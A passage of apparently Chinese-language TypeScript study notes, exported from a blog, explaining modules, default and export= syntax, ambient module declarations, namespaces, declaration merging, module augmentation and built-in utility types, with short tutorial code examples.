导入它。 // JQuery.d.ts declare let $: JQuery; export default $; // App.ts import $ from &quot;jquery&quot;; $(&quot;button.continue&quot;).html(&quot;Next Step...&quot;); 类和函数声明可以直接被标记为默认导出。标记为默认导出的类和函数的名字是可以省略的。 // ZipCodeValidator.ts export default class ZipCodeValidator { static numberRegexp = /^[0-9]+$/; isAcceptable(s: string) { return s.length === 5 &amp;&amp; ZipCodeValidator.numberRegexp.test(s); } } // Test.ts import validator from &quot;./ZipCodeValidator&quot;; let myValidator = new validator(); default 导出也可以是一个值。 // OneTwoThree.ts export default &quot;123&quot;; // Log.ts import num from &quot;./OneTwoThree&quot;; console.log(num); // &quot;123&quot; export = 和 import = require() CommonJS 和 AMD 都有一个 exports 对象的概念，它包含一个模块的所有导出。 exports 可以被赋值为一个对象, 这种情况下其作用就类似于 es6 语法里的默认导出，即 export default 语法了。虽然作用相似，但是 export default 语法并不能兼容 CommonJS 和 AMD 的 exports。 为了支持 CommonJS 和 AMD 的 exports, TypeScript 提供了 export = 语法。 export = 语法定义一个模块的导出对象，这可以是类、接口、命名空间、函数或枚举。 使用 export = 导出一个模块，则必须使用 TypeScript 的特定语法 import module = require(&quot;module&quot;) 来导入此模块。 // ZipCodeValidator.ts let numberRegexp = /^[0-9]+$/; class ZipCodeValidator { isAcceptable(s: string) { return s.length === 5 &amp;&amp; numberRegexp.test(s); } } export = ZipCodeValidator; // Test.ts import zip = require(&quot;./ZipCodeValidator&quot;); let strings = [&quot;Hello&quot;, &quot;98052&quot;, &quot;101&quot;]; let validator = new zip(); strings.forEach((s) =&gt; { console.log( `&quot;${s}&quot; - ${validator.isAcceptable(s) ? &quot;matches&quot; : &quot;does not match&quot;}` ); }); 可选的模块加载和其它高级加载场景 有时候，你只想在某种条件下才加载某个模块。在 TypeScript 里，使用下面的方式来实现它和其它高级的加载场景，我们可以直接调用模块加载器并且可以保证类型完全。 编译器会检测是否每个模块都会在生成的 JavaScript 中用到。如果一个模块标识符只在类型注解部分使用，并且完全没有在表达式中使用时，就不会生成 require 这个模块的代码。 这种模式的核心是 import id = require(&quot;...&quot;) 语句可以让我们访问模块导出的类型。模块加载器会被动态调用（通过 require），就像下面 if 代码块里那样。它利用了省略引用的优化，所以模块只在被需要时加载。为了让这个模块工作，一定要注意 import 定义的标识符只能在表示类型处使用（不能在会转换成 JavaScript 的地方）。 省略未使用的引用是一种很好的性能优化，并且还允许可选地加载这些模块。 为了确保类型安全性，我们可以使用 typeof 关键字。当在表示类型的地方使用 typeof 关键字时，会得出一个类型值，这里就表示模块的类型。 Node.js 中的动态模块加载 declare function require(moduleName: string): any; import { ZipCodeValidator as Zip } from &quot;./ZipCodeValidator&quot;; if (needZipValidation) { let ZipCodeValidator: typeof Zip = require(&quot;./ZipCodeValidator&quot;); let validator = new ZipCodeValidator(); if (validator.isAcceptable(&quot;...&quot;)) { /* ... */ } } 使用其他 JavaScript 库 要想描述非 TypeScript 编写的类库的类型，我们需要声明类库所暴露出的 API。我们叫它声明因为它不是“外部程序”的具体实现。它们通常是在 .d.ts 文件里定义的。如果你熟悉 C/C++，你可以把它们当做 .h 文件。 外部模块 在 Node.js 里大部分工作是通过加载一个或多个模块实现的。我们可以使用顶级的 export 声明来为每个模块都定义一个 .d.ts 文件，但最好还是写在一个大的 .d.ts 文件里。我们使用与构造一个外部命名空间相似的方法，但是这里使用 module 关键字并且把名字用引号括起来，方便之后 import。例如： // node.d.ts（简化） declare module &quot;url&quot; { export interface Url { protocol?: string; hostname?: string; pathname?: string; } export function parse( urlStr: string, parseQueryString?, slashesDenoteHost? ): Url; } declare module &quot;path&quot; { export function normalize(p: string): string; export function join(...paths: any[]): string; export var sep: string; } 现在我们可以 /// &lt;reference&gt; node.d.ts 并且使用 import url = require(&quot;url&quot;); 或 import * as URL from &quot;url&quot; 加载模块。 /// &lt;reference path=&quot;node.d.ts&quot;/&gt; import * as URL from &quot;url&quot;; let myUrl = URL.parse(&quot;https://www.typescriptlang.org&quot;); 外部模块简写 假如你不想在使用一个新模块之前花时间去编写声明，你可以采用声明的简写形式以便能够快速使用它。 // declarations.d.ts declare module &quot;hot-new-module&quot;; // 简写模块里所有导出的类型将是any。 import x, { y } from &quot;hot-new-module&quot;; x(y); 模块声明通配符 某些模块加载器如 SystemJS 和 AMD 支持导入非 JavaScript 内容。它们通常会使用一个前缀或后缀来表示特殊的加载语法。模块声明通配符可以用来表示这些情况。 declare module &quot;*!text&quot; { const content: string; export default content; } declare module &quot;json!*&quot; { const value: any; export default value; } 现在你就可以导入匹配 &quot;*!text&quot; 或 &quot;json!*&quot; 的内容了。 import fileContent from &quot;./xyz.txt!text&quot;; import data from &quot;json!http://example.com/data.json&quot;; console.log(data, fileContent); UMD 模块 有些模块被设计成兼容多个模块加载器，或者不使用模块加载器（全局变量）。它们以 UMD 模块为代表。这些库可以通过导入的形式或全局变量的形式访问。例如： // math-lib.d.ts export function isPrime(x: number): boolean; export as namespace mathLib; 之后，这个库可以在某个模块里通过导入来使用： import { isPrime } from &quot;math-lib&quot;; isPrime(2); mathLib.isPrime(2); // 错误: 不能在模块内使用全局定义。 它同样可以通过全局变量的形式使用，但只能在某个脚本（指不带有模块导入或导出的脚本文件）里。 mathLib.isPrime(2); 构建模块的指南 尽可能地在顶层导出 用户应该更容易地使用你模块导出的内容，嵌套层次过多会变得难以处理。 从你的模块中导出一个命名空间就是一个增加嵌套的例子。虽然命名空间有时候有它们的用处，在使用模块的时候它们额外地增加了一层，这对用户来说是很不便的并且通常是多余的。 导出类的静态方法也有同样的问题 - 这个类本身就增加了一层嵌套。除非它能方便表述或便于清晰使用，否则请考虑直接导出一个辅助方法。 如果仅导出单个 class 或 function，使用 export default 就像“在顶层上导出”帮助减少用户使用的难度，一个默认的导出也能起到这个效果。如果一个模块就是为了导出特定的内容，那么你应该考虑使用一个默认导出。这会令模块的导入和使用变得些许简单。 // MyClass.ts export default class SomeType { constructor() { ... } } // MyFunc.ts export default function getThing() { return &quot;thing&quot;; } // Consumer.ts import t from &quot;./MyClass&quot;; import f from &quot;./MyFunc&quot;; let x = new t(); console.log(f()); 对用户来说这是最理想的。他们可以随意命名导入模块的类型（本例为 t）并且不需要多余的（.）来找到相关对象。 如果要导出多个对象，把它们放在顶层里导出 // MyThings.ts export class SomeType { /* ... */ } export function someFunc() { /* ... */ } 相反地，当导入的时候需要明确地列出导入的名字： // Consumer.ts import { SomeType, someFunc } from &quot;./MyThings&quot;; let x = new SomeType(); let y = someFunc(); 当你要导入大量内容的时候使用命名空间导入模式 // MyLargeModule.ts export class Dog { ... } export class Cat { ... } export class Tree { ... } export class Flower { ... } // Consumer.ts import * as myLargeModule from &quot;./MyLargeModule.ts&quot;; let x = new myLargeModule.Dog(); 使用重新导出进行扩展 你可能经常需要去扩展一个模块的功能。JS 里常用的一个模式是 JQuery 那样去扩展原对象。如我们之前提到的，模块不会像全局命名空间对象那样去合并。推荐的方案是 不要去改变原来的对象，而是导出一个新的实体来提供新的功能。 假设 Calculator.ts 模块里定义了一个简单的计算器实现。这个模块同样提供了一个辅助函数来测试计算器的功能，通过传入一系列输入的字符串并在最后给出结果。 // Calculator.ts export class Calculator { private current = 0; private memory = 0; private operator: string; protected processDigit(digit: string, currentValue: number) { if (digit &gt;= &quot;0&quot; &amp;&amp; digit &lt;= &quot;9&quot;) { return currentValue * 10 + (digit.charCodeAt(0) - &quot;0&quot;.charCodeAt(0)); } } protected processOperator(operator: string) { if ([&quot;+&quot;, &quot;-&quot;, &quot;*&quot;, &quot;/&quot;].indexOf(operator) &gt;= 0) { return operator; } } protected evaluateOperator( operator: string, left: number, right: number ): number { switch (this.operator) { case &quot;+&quot;: return left + right; case &quot;-&quot;: return left - right; case &quot;*&quot;: return left * right; case &quot;/&quot;: return left / right; } } private evaluate() { if (this.operator) { this.memory = this.evaluateOperator( this.operator, this.memory, this.current ); } else { this.memory = this.current; } this.current = 0; } public handleChar(char: string) { if (char === &quot;=&quot;) { this.evaluate(); return; } else { let value = this.processDigit(char, this.current); if (value !== undefined) { this.current = value; return; } else { let value = this.processOperator(char); if (value !== undefined) { this.evaluate(); this.operator = value; return; } } } throw new Error(`Unsupported input: '${char}'`); } public getResult() { return this.memory; } } export function test(c: Calculator, input: string) { for (let i = 0; i &lt; input.length; i++) { c.handleChar(input[i]); } console.log(`result of '${input}' is '${c.getResult()}'`); } 下面使用导出的 test 函数来测试计算器。 // TestCalculator.ts import { Calculator, test } from &quot;./Calculator&quot;; let c = new Calculator(); test(c, &quot;1+2*33/11=&quot;); // 9 现在扩展它，添加支持输入其它进制（十进制以外）。 // ProgrammerCalculator.ts import { Calculator } from &quot;./Calculator&quot;; class ProgrammerCalculator extends Calculator { static digits = [&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;, &quot;E&quot;, &quot;F&quot;,]; constructor(public base: number) { super(); const maxBase = ProgrammerCalculator.digits.length; if (base &lt;= 0 || base &gt; maxBase) { throw new Error(`base has to be within 0 to ${maxBase} inclusive.`); } } protected processDigit(digit: string, currentValue: number) { if (ProgrammerCalculator.digits.indexOf(digit) &gt;= 0) { return ( currentValue * this.base + ProgrammerCalculator.digits.indexOf(digit) ); } } } // Export the new extended calculator as Calculator export { ProgrammerCalculator as Calculator }; export { test } from &quot;./Calculator&quot;; 新的 ProgrammerCalculator 模块导出的 API 与原先的 Calculator 模块很相似，但却没有改变原模块里的对象。 // TestProgrammerCalculator.ts import { Calculator, test } from &quot;./ProgrammerCalculator&quot;; let c = new Calculator(2); test(c, &quot;001+010=&quot;); // 3 模块里不要使用命名空间 当初次进入基于模块的开发模式时，可能总会控制不住要将导出包裹在一个命名空间里。模块具有其自己的作用域，并且只有导出的声明才会在模块外部可见。记住这点，命名空间在使用模块时几乎没什么价值。 在组织方面，命名空间对于在全局作用域内对逻辑上相关的对象和类型进行分组是很便利的。例如，在 C# 里，你会从 System.Collections 里找到所有集合的类型。通过将类型有层次地组织在命名空间里，可以方便用户找到与使用那些类型。然而，模块本身已经存在于文件系统之中，我们必须通过路径和文件名找到它们，这已经提供了一种逻辑上的组织形式。例如我们可以创建 /collections/generic/ 文件夹，把相应模块放在这里面。 命名空间对解决全局作用域里命名冲突来说是很重要的。比如，你可以有一个 My.Application.Customer.AddForm 和 My.Application.Order.AddForm -- 两个类型的名字相同，但命名空间不同。然而，这对于模块来说却不是一个问题。在一个模块里，没有理由两个对象拥有同一个名字。从模块的使用角度来说，使用者会挑出他们用来引用模块的名字，所以也没有理由发生重名的情况。 常见错误 文件的顶层声明是 export namespace Foo { ... }（删除 Foo 并把所有内容向上层移动一层）。 文件只有一个 export class 或 export function（考虑使用 export default）。 多个文件的顶层具有同样的 export namespace Foo {（不要以为这些会合并到一个 Foo 中！）。 命名空间和模块 使用命名空间 命名空间是一种特定于 TypeScript 的代码组织方式。 命名空间只是在全局命名空间中一个普通的带有名字的 JavaScript 对象，这使得命名空间成为一个非常简单的结构来使用。 与模块不同，它们可以跨越多个文件，并可以通过 --outFile 标志结合在一起。 命名空间是在 Web 应用程序中构建代码的好方法，你可以把所有依赖都放在 HTML 页面的 &lt;script&gt; 标签里。 但就像其它的全局命名空间污染一样，它很难去识别组件之间的依赖关系，尤其是在大型的应用中。 使用模块 像命名空间一样，模块可以包含代码和声明。不同的是模块可以声明它的依赖。 模块还依赖于模块加载器（例如 CommonJs/Require.js）或支持 ES 模块的运行时。对于小型的JS应用来说可能没必要，但是对于大型应用，这一点点的花费会带来长久的模块化和可维护性上的便利。模块也提供了更好的代码重用，更强的封闭性以及更好的使用工具进行优化。 对于 Node.js 应用来说，模块是默认并推荐的组织代码的方式，我们建议在现代代码中使用模块而不是名称空间。 从 ECMAScript 2015 开始，模块成为了语言内置的部分，应该会被所有正常的解释引擎所支持。因此，对于新项目来说推荐使用模块做为组织代码的方式。 常见陷阱 这部分我们会描述常见的命名空间和模块的使用陷阱和如何去避免它们。 一个常见的错误是使用 /// &lt;reference ... /&gt; 语法来引用模块文件，而不是使用 import 语句。要理解这之间的区别，我们首先应该弄清编译器是如何根据 import 路径（例如 import x from &quot;...&quot;; 或 import x = require(&quot;...&quot;) 里面的 ...）来定位模块的类型信息的。编译器首先尝试去查找相应路径下的 .ts，.tsx，然后是 .d.ts。如果这些文件都找不到，编译器会查找 外部模块声明。回想一下，这些需要在 .d.ts 文件中声明。 myModules.d.ts // 在 .d.ts 文件或不是模块的 .ts 文件中： declare module &quot;SomeModule&quot; { export function fn(): string; } myOtherModule.ts /// &lt;reference path=&quot;myModules.d.ts&quot; /&gt; import * as m from &quot;SomeModule&quot;; 这里的引用标签指定了外来模块的位置。这就是一些 TypeScript 例子中引用 node.d.ts 的方法。 不必要的命名空间。假如有以下文件： // shapes.ts export namespace Shapes { export class Triangle { /* ... */ } export class Square { /* ... */ } } 这里的顶级命名空间 Shapes 包裹了 Triangle 和 Square。对于使用它的人来说这是令人迷惑和讨厌的： // shapeConsumer.ts import * as shapes from &quot;./shapes&quot;; let t = new shapes.Shapes.Triangle(); // shapes.Shapes? TypeScript 里模块的一个特点是不同的模块永远也不会在相同的作用域内使用相同的名字。因为使用模块的人会为它们命名，所以完全没有必要把导出的符号包裹在一个命名空间里。 再次重申，不应该对模块使用命名空间，使用命名空间是为了提供逻辑分组和避免命名冲突。模块文件本身已经是一个逻辑分组，并且它的名字是由导入这个模块的代码指定，所以没有必要为导出的对象增加额外的模块层。 下面是改进后的例子： // shapes.ts export class Triangle { /* ... */ } export class Square { /* ... */ } // shapeConsumer.ts import * as shapes from &quot;./shapes&quot;; let t = new shapes.Triangle(); 就像每个 JS 文件对应一个模块一样，TypeScript 里模块文件与生成的 JS 文件也是一一对应的。这会产生一种影响，根据你指定的目标模块系统的不同，你可能无法连接多个模块源文件。例如当目标模块系统为 commonjs 或 umd 时，无法使用 outFile 选项。但是在 TypeScript 1.8 以上的版本，当 target 为 amd 或 system 时能够使用 outFile 选项。 声明合并 TypeScript 中有些独特的概念可以在类型层面上描述 JavaScript 对象的模型。这其中尤其独特的一个例子是“声明合并”的概念。 “声明合并”是指编译器将针对同一个名字的两个独立声明合并为单一声明。合并后的声明同时拥有原先两个声明的特性。任何数量的声明都可被合并；不局限于两个声明。 理解了这个概念，将有助于操作现有的 JavaScript 代码。同时，也会有助于理解更多高级抽象的概念。 基础概念 TypeScript 中的声明会创建以下三种实体之一：命名空间，类型或值。下表说明了声明类型都创建了什么实体： 声明类型 创建了命名空间 创建了类型 创建了值 Namespace √ √ Class √ √ Enum √ √ Interface √ Type Alias √ Function √ Variable √ 创建命名空间的声明会新建一个命名空间，它包含了用（.）符号来访问时使用的名字。创建类型的声明是：用声明的模型创建一个类型并绑定到给定的名字上。最后，创建值的声明会创建在 JavaScript 输出中看到的值。 合并接口 最简单也最常见的声明合并类型是接口合并。从根本上说，合并的机制是把双方的成员放到一个同名的接口里。 interface Box { height: number; width: number; } interface Box { scale: number; } let box: Box = { height: 5, width: 6, scale: 10 }; 接口的非函数的成员应该是唯一的。如果它们不是唯一的，那么它们必须是相同的类型。如果两个接口中同时声明了同名的非函数成员且它们的类型不同，则编译器会报错。 对于函数成员，每个同名函数声明都会被当成这个函数的一个重载。同时需要注意，当接口 A 与后面的接口 A 合并时，后面的接口具有更高的优先级。 interface Cloner { clone(animal: Animal): Animal; } interface Cloner { clone(animal: Sheep): Sheep; } interface Cloner { clone(animal: Dog): Dog; clone(animal: Cat): Cat; } 这三个接口将合并成一个声明，每组接口里的声明顺序保持不变，但各组接口之间的顺序是后来的接口重载出现在靠前位置。 interface Cloner { clone(animal: Dog): Dog; clone(animal: Cat): Cat; clone(animal: Sheep): Sheep; clone(animal: Animal): Animal; } 有一个例外是当出现特殊的函数签名时，如果签名里有一个参数的类型是 单一的字符串字面量（例如不是字符串字面量的联合类型），那么它将会被提升到重载列表的最顶端。 interface Document { createElement(tagName: any): Element; } interface Document { createElement(tagName: &quot;div&quot;): HTMLDivElement; createElement(tagName: &quot;span&quot;): HTMLSpanElement; } interface Document { createElement(tagName: string): HTMLElement; createElement(tagName: &quot;canvas&quot;): HTMLCanvasElement; } 合并后的 Document 如下： interface Document { createElement(tagName: &quot;canvas&quot;): HTMLCanvasElement; createElement(tagName: &quot;div&quot;): HTMLDivElement; createElement(tagName: &quot;span&quot;): HTMLSpanElement; createElement(tagName: string): HTMLElement; createElement(tagName: any): Element; } 合并命名空间 与接口类似，同名的命名空间也会合并它们的成员。由于命名空间同时创建命名空间和值，我们需要了解两者如何合并。 为了合并命名空间，模块导出的同名接口进行合并，构成单一命名空间，内含合并后的接口。 对于命名空间里值的合并，如果当前已经存在给定名字的命名空间，那么后来的命名空间的导出成员会被添加到第一个命名空间来扩展它。 namespace Animals { export class Zebra {} } namespace Animals { export interface Legged { numberOfLegs: number; } export class Dog {} } 合并后： namespace Animals { export interface Legged { numberOfLegs: number; } export class Zebra {} export class Dog {} } 非导出成员仅在其原有的（合并前的）命名空间内可见，也就是说合并之后，从其它命名空间合并进来的成员无法访问非导出成员。 namespace Animal { let haveMuscles = true; export function animalsHaveMuscles() { return haveMuscles; } } namespace Animal { export function doAnimalsHaveMuscles() { return haveMuscles; // Error, because haveMuscles is not accessible here } } 因为 haveMuscles 并没有导出，只有 animalsHaveMuscles 函数共享了原始未合并的命名空间可以访问这个变量。doAnimalsHaveMuscles 函数虽是合并命名空间的一部分，但是访问不了未导出的成员。 将命名空间与类、函数和枚举合并 命名空间足够灵活，可以与其他类型的声明合并。只要命名空间的定义符合将要合并类型的定义，合并结果包含两者的声明类型。TypeScript 使用这个功能去实现一些 JavaScript 里的设计模式。 将命名空间与类合并，这为用户提供了一种描述内部类的方法。 class Album { label: Album.AlbumLabel; } namespace Album { export class AlbumLabel {}; export const num = 10; } console.log(new Album().label, Album.AlbumLabel, Album.num) // undefined [Function: AlbumLabel] 10 命名空间内的成员必须导出，合并后的类才能访问。 命名空间内导出的成员，相当于合并后类的静态属性。 命名空间要放在类的定义后面。 创建一个函数稍后扩展它增加一些属性也是很常见的。TypeScript 使用声明合并来达到这个目的并保证类型安全。 function buildLabel(name: string): string { return buildLabel.prefix + name + buildLabel.suffix; } namespace buildLabel { export let suffix = &quot;&quot;; export let prefix = &quot;Hello, &quot;; } console.log(buildLabel('Mr.Pioneer')) // Hello, Mr.Pioneer.C 同样，命名空间可用于扩展具有静态成员的枚举。 enum Color { red = 1, green = 2, blue = 4, } namespace Color { export function mixColor(colorName: string) { if (colorName == &quot;yellow&quot;) { return Color.red + Color.green; } else if (colorName == &quot;white&quot;) { return Color.red + Color.green + Color.blue; } else if (colorName == &quot;magenta&quot;) { return Color.red + Color.blue; } else if (colorName == &quot;cyan&quot;) { return Color.green + Color.blue; } } } console.log(Color.mixColor('yellow')); // 3 目前，类不能与其它类或变量合并。 模块扩展 虽然 JavaScript 模块不支持合并，但你可以为导入的对象打补丁以更新它们。 // observable.ts export class Observable&lt;T&gt; { // ... implementation left as an exercise for the reader ... } // map.ts import { Observable } from &quot;./observable&quot;; Observable.prototype.map = function (f) { // ... another exercise for the reader }; 这在 TypeScript 中也能正常工作，但编译器不知道 Observable.prototype.map，你可以使用扩展模块来将它告诉编译器： // observable.ts export class Observable&lt;T&gt; { // ... implementation left as an exercise for the reader ... } // map.ts import { Observable } from &quot;./observable&quot;; declare module &quot;./observable&quot; { interface Observable&lt;T&gt; { map&lt;U&gt;(f: (x: T) =&gt; U): Observable&lt;U&gt;; } } Observable.prototype.map = function(f) { let rets = f(1); return new Observable&lt;typeof rets&gt;(); }; // consumer.ts import { Observable } from &quot;./observable&quot;; import &quot;./map&quot;; let o: Observable&lt;number&gt; = new Observable(); o.map((x) =&gt; x.toFixed()); 模块名的解析和用 import/export 解析模块标识符的方式是一致的，当这些声明在扩展中合并时，就好像在原始位置被声明了一样。但是有两个限制： 不能在扩展中声明新的顶级声明－仅可以扩展模块中已经存在的声明。 默认导出也不能扩展－只能扩展命名导出。因为需要通过导出名称扩展导出，而 default 是保留字。 全局扩展 还可以从模块内部向全局范围添加声明。 全局扩展与模块扩展的行为和限制是相同的。 像 JQuery 那样，在浏览器中全局就可以访问的对象，通常我们会使用 namespace，好处就是防止命名冲突。 通常全局变量在源码中会有如下特性： 顶级的 var 语句或 function 声明。 挂载变量到 window 上。 export class Observable&lt;T&gt; { // ... still no implementation ... } declare global { interface Array&lt;T&gt; { toObservable(): Observable&lt;T&gt;; } } Array.prototype.toObservable = function () { return {}; }; namespace jQuery { export let $: { version: number }; } let $ = jQuery.$; declare global { interface Window { $ } } ","link":"https://zkrisj.github.io/post/typescript-ming-ming-kong-jian-mo-kuai-sheng-ming-he-bing-or-qing-xun-ying-bi-ji/"},{"title":"TypeScript 工具类型、装饰器、混入(Mixins) ｜ 青训营笔记","content":"TypeScript 介绍 TypeScript 是 JavaScript 的超集，提供了 JavaScript 的所有功能，并提供了可选的静态类型、Mixin、类、接口和泛型等特性。 TypeScript 的目标是通过其类型系统帮助及早发现错误并提高 JavaScript 开发效率。 通过 TypeScript 编译器或 Babel 转码器转译为 JavaScript 代码，可运行在任何浏览器，任何操作系统。 任何现有的 JavaScript 程序都可以运行在 TypeScript 环境中，并只对其中的 TypeScript 代码进行编译。 在完整保留 JavaScript 运行时行为的基础上，通过引入静态类型定义来提高代码的可维护性，减少可能出现的 bug。 永远不会改变 JavaScript 代码的运行时行为，例如数字除以零等于 Infinity。这意味着，如果将代码从 JavaScript 迁移到 TypeScript ，即使 TypeScript 认为代码有类型错误，也可以保证以相同的方式运行。 对 JavaScript 类型进行了扩展，增加了例如 any、unknown、never、void。 一旦 TypeScript 的编译器完成了检查代码的工作，它就会 擦除 类型以生成最终的“已编译”代码。这意味着一旦代码被编译，生成的普通 JS 代码便没有类型信息。这也意味着 TypeScript 绝不会根据它推断的类型更改程序的 行为。最重要的是，尽管可能会在编译过程中看到类型错误，但类型系统自身与程序如何运行无关。 在较大型的项目中，可以在单独的文件 tsconfig.json 中声明 TypeScript 编译器的配置，并细化地调整其工作方式、严格程度、以及将编译后的文件存储在何处。 工具类型 TypeScript 提供了多种工具类型（实用类型）来帮助常见的类型转换，这些工具类型在全局范围内可用。 Awaited Awaited&lt;Type&gt; 模拟异步函数中的 await 或 Promises 上的 .then() 方法返回值类型。 type A = Awaited&lt;Promise&lt;string&gt;&gt;; // type A = string type B = Awaited&lt;Promise&lt;Promise&lt;number&gt;&gt;&gt;; // type B = number type C = Awaited&lt;boolean | Promise&lt;number&gt;&gt;; // type C = number | boolean ConstructorParameters ConstructorParameters&lt;Type&gt; 从构造函数的类型生成一个包含所有参数类型的元组类型（如果 Type 不是函数，则生成 never 类型）。 type T0 = ConstructorParameters&lt;ErrorConstructor&gt;; // type T0 = [message?: string] type T1 = ConstructorParameters&lt;FunctionConstructor&gt;; // type T1 = string[] type T2 = ConstructorParameters&lt;RegExpConstructor&gt;; // type T2 = [pattern: string | RegExp, flags?: string] type T3 = ConstructorParameters&lt;any&gt;; // type T3 = unknown[] type T4 = ConstructorParameters&lt;Function&gt;; // Type 'Function' does not satisfy the constraint 'abstract new (...args: any) =&gt; any'. // Type 'Function' provides no match for the signature 'new (...args: any): any'. // type T4 = never Exclude Exclude&lt;UnionType, ExcludedMembers&gt; 从联合类型中删除指定类型。 type T0 = Exclude&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot;, &quot;a&quot;&gt;; // type T0 = &quot;b&quot; | &quot;c&quot; type T1 = Exclude&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot;, &quot;a&quot; | &quot;b&quot;&gt;; // type T1 = &quot;c&quot; type T2 = Exclude&lt;string | number | (() =&gt; void), Function&gt;; // type T2 = string | number Extract Extract&lt;Type, Union&gt; 通过从 Type 中提取可分配给 Union 的所有联合成员来构造一个类型。 type T0 = Extract&lt;&quot;a&quot; | &quot;b&quot; | &quot;c&quot;, &quot;a&quot; | &quot;f&quot;&gt;; // type T0 = &quot;a&quot; type T1 = Extract&lt;string | number | (() =&gt; void), Function&gt;; // type T1 = () =&gt; void InstanceType InstanceType&lt;Type&gt; 构造一个由 Type 中构造函数的实例类型组成的类型。 class C { x = 0; y = 0; } type T0 = InstanceType&lt;typeof C&gt;; // type T0 = C type T1 = InstanceType&lt;any&gt;; // type T1 = any type T2 = InstanceType&lt;never&gt;; // type T2 = never type T3 = InstanceType&lt;string&gt;; // Type 'string' does not satisfy the constraint 'abstract new (...args: any) =&gt; any'. // type T3 = any type T4 = InstanceType&lt;Function&gt;; // Type 'Function' does not satisfy the constraint 'abstract new (...args: any) =&gt; any'. // Type 'Function' provides no match for the signature 'new (...args: any): any'. // type T4 = any NonNullable NonNullable&lt;Type&gt; 通过从 Type 中排除 null 和 undefined 来构造一个类型。 type T0 = NonNullable&lt;string | number | undefined&gt;; // type T0 = string | number type T1 = NonNullable&lt;string[] | null | undefined&gt;; // type T1 = string[] Omit Omit&lt;Type, Keys&gt; 从对象类型中删除 keys（字符串文字或字符串文字的并集）来构造一个类型。 interface Person { name: string; age: number; location?: string; } const bob: Omit&lt;Person, 'age' | 'location'&gt; = { name: 'Bob' // `Omit` 已经从类型中删除了年龄和位置，它们不能在这里定义 }; console.log(bob); // { name: 'Bob' } OmitThisParameter OmitThisParameter&lt;Type&gt; 从类型中删除 this 参数，创建一个没有 this 参数的新函数类型，泛型会被擦除，只有最后一个重载签名可以被传播到新的函数类型中。如果 Type 没有显式声明 this 参数，则结果只是 Type。 function toHex(this: Number) { return this.toString(16); } const fiveToHex: OmitThisParameter&lt;typeof toHex&gt; = toHex.bind(16); console.log(fiveToHex()); // 10 Parameters Parameters&lt;Type&gt; 根据函数类型 Type 的参数中使用的类型构造元组类型。 declare function f1(arg: { a: number; b: string }): void; type T0 = Parameters&lt;() =&gt; string&gt;; // type T0 = [] type T1 = Parameters&lt;(s: string) =&gt; void&gt;; // type T1 = [s: string] type T2 = Parameters&lt;&lt;T&gt;(arg: T) =&gt; T&gt;; // type T2 = [arg: unknown] type T3 = Parameters&lt;typeof f1&gt;; // type T3 = [arg: { // a: number; // b: string; // }] type T4 = Parameters&lt;any&gt;; // type T4 = unknown[] type T5 = Parameters&lt;never&gt;; // type T5 = never type T6 = Parameters&lt;string&gt;; // Type 'string' does not satisfy the constraint '(...args: any) =&gt; any'. // type T6 = never type T7 = Parameters&lt;Function&gt;; // Type 'Function' does not satisfy the constraint '(...args: any) =&gt; any'. // Type 'Function' provides no match for the signature '(...args: any): any'. // type T7 = never Partial Partial&lt;Type&gt; 更改对象中的所有属性为可选。 interface Point { x: number; y: number; } let pointPart: Partial&lt;Point&gt; = {}; // `Partial` 使得 x 与 y 都变成可选 pointPart.x = 10; console.log(pointPart); // { x: 10 } Pick Pick&lt;Type, Keys&gt; 从对象类型中选择指定 keys（字符串文字或字符串文字的并集）来构造一个类型。 interface Person { name: string; age: number; location?: string; } const bob: Pick&lt;Person, 'name' | 'location'&gt; = { name: 'Bob', // location: 'Bob', // `Pick` 只保留了姓名和位置（可选），年龄已从类型中删除，无法在此处定义 }; console.log(bob); // { name: 'Bob' } Readonly Readonly&lt;Type&gt; 构造一个所有属性都设置为 readonly 的类型。 interface Todo { title: string; description: string; } const todo: Readonly&lt;Todo&gt; = { title: &quot;Delete inactive users&quot;, description: &quot;clear clutter&quot;, }; // Readonly将Todo所有属性都设置为只读,它们都无法修改 todo.title = &quot;Hello&quot;; // Cannot assign to 'title' because it is a read-only property. todo.description = &quot;Hello&quot;; // Cannot assign to 'description' because it is a read-only property. Record Record 是定义具有特定键类型和值类型的对象类型的简写方式，用于将一种类型的属性映射到另一种类型。Record&lt;Keys, Type&gt; 将构造一个新的对象类型，其属性键为 Keys，属性值为 Type。 const nameAgeMap: Record&lt;string, number&gt; = { 'Alice': 21, 'Bob': 25 }; 这里的 Record&lt;string, number&gt; 相当于 { [key: string]: number }。 Required Required&lt;Type&gt; 更改对象中的所有属性为必须的。 interface Car { make: string; model: string; mileage?: number; } let myCar: Required&lt;Car&gt; = { make: 'Ford', model: 'Focus', mileage: 12000 // `Required` 强制 mileage 必须定义 }; console.log(myCar); // { make: 'Ford', model: 'Focus', mileage: 12000 } ReturnType ReturnType&lt;Type&gt; 提取函数类型的返回类型。 declare function f1(): { a: number; b: string }; type T0 = ReturnType&lt;() =&gt; string&gt;; // type T0 = string type T1 = ReturnType&lt;(s: string) =&gt; void&gt;; // type T1 = void type T2 = ReturnType&lt;&lt;T&gt;() =&gt; T&gt;; // type T2 = unknown type T3 = ReturnType&lt;&lt;T extends U, U extends number[]&gt;() =&gt; T&gt;; // type T3 = number[] type T4 = ReturnType&lt;typeof f1&gt;; // type T4 = { // a: number; // b: string; // } type T5 = ReturnType&lt;any&gt;; // type T5 = any type T6 = ReturnType&lt;never&gt;; // type T6 = never type T7 = ReturnType&lt;string&gt;; // Type 'string' does not satisfy the constraint '(...args: any) =&gt; any'. // type T7 = any type T8 = ReturnType&lt;Function&gt;; // Type 'Function' does not satisfy the constraint '(...args: any) =&gt; any'. // Type 'Function' provides no match for the signature '(...args: any): any'. // type T8 = any ThisParameterType ThisParameterType&lt;Type&gt; 提取函数类型的 this 参数的类型，如果函数类型没有 this 参数，则为 unknown。 function toHex(this: Number) { return this.toString(16); } function numberToString(n: ThisParameterType&lt;typeof toHex&gt;) { return toHex.apply(n); } console.log(numberToString(16)); // 10 ThisType ThisType&lt;Type&gt; 用作上下文 this 类型的标记，但不返回转换后的类型，必须启用 noImplicitThis 标志才能使用。该接口只是一个在 lib.d.ts 